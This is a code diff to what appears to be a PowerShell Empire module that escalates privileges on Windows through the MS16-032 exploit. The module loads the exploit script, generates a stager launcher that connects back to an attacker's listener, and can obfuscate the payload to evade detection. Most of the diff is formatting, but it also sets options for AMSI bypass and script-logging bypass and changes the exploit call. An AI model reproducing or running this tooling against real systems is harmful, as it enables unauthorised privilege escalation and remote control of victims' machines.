@@ -23,17 +23,17 @@ class Module(object):
 
             'Techniques': ['T1068'],
 
-            'Background' : True,
+            'Background': True,
 
-            'OutputExtension' : None,
+            'OutputExtension': None,
 
-            'NeedsAdmin' : False,
+            'NeedsAdmin': False,
 
-            'OpsecSafe' : False,
-            
-            'Language' : 'powershell',
+            'OpsecSafe': False,
 
-            'MinLanguageVersion' : '2',
+            'Language': 'powershell',
+
+            'MinLanguageVersion': '2',
 
             'Comments': [
                 'Credit to James Forshaw (@tiraniddo) for exploit discovery and',
@@ -44,30 +44,30 @@ class Module(object):
         }
 
         self.options = {
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Agent': {
+                'Description': 'Agent to run module on.',
+                'Required': True,
+                'Value': ''
             },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to use.',
+                'Required': True,
+                'Value': ''
             },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'UserAgent': {
+                'Description': 'User-agent string to use for the staging request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Proxy': {
+                'Description': 'Proxy to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'ProxyCreds': {
+                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             }
         }
 
@@ -79,9 +79,8 @@ class Module(object):
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-MS16032.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
@@ -103,19 +102,23 @@ class Module(object):
         l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
         l.options['Proxy']['Value'] = self.options['Proxy']['Value']
         l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+        l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+        l.options['SafeChecks']['Value'] = 'False'
+        l.options['ScriptLogBypass']['Value'] = 'False'
+        l.options['AMSIBypass']['Value'] = 'False'
         l.options['Base64']['Value'] = 'False'
         launcherCode = l.generate()
 
         # need to escape characters
-        launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"","'")
-        
-        scriptEnd = 'Invoke-MS16032 -Command "' + launcherCode + '"'
+        launcherCode = launcherCode.replace("`", "``").replace("$", "`$").replace("\"", "'")
+
+        scriptEnd = 'Invoke-MS16-032 "' + launcherCode + '"'
         scriptEnd += ';"`nInvoke-MS16032 completed."'
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
+                                          obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         script = helpers.keyword_obfuscation(script)
 
         return script
-
